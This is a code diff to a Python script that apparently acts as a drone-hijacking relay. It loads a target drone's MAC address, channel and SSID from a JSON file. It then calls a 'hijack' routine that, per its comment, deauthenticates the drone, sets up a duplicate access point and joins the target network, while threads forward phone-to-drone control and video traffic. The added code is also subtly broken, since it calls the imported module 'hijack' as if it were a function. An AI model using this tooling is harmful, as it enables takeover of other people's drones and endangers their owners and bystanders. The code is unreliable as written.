@@ -1,5 +1,29 @@
+import json
+import os
 import socket
 import threading
+import hijack
+
+##################
+### PREP MODULE ##
+##################
+
+# Get path to project root directory (two levels up from this file)
+target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
+scan_info = None
+
+# Intialize target drone data
+with open(target_data_file, 'r') as file:
+    scan_info = json.load(file)
+
+target_info = scan_info.get("target_info", {})
+target_mac = target_info.get("mac_address")
+target_channel = target_info.get("channel")
+target_ssid = target_info.get("raw_string")
+
+options_info = scan_info.get("options", {})
+packets = options_info.get("packets")
+interface = options_info.get("interface")
 
 # ── Config ────────────────────────────────────────────────────────────────────
 AP_INTERFACE       = "wlx9cefd5f754df"
@@ -114,6 +138,9 @@ def drone_video_to_phone():
         phone_video_sock.sendto(data, (target[0], DRONE_VIDEO_PORT))
         # Video is high-bandwidth — skip per-packet logging
 
+
+# Run the hijack program to deauth, set up the duplcate AP, and connect to the target network
+hijack(interface, target_mac, target_channel, packets, target_ssid)
 
 # ── Start threads ─────────────────────────────────────────────────────────────
 threading.Thread(target=phone_to_drone,      daemon=True).start()
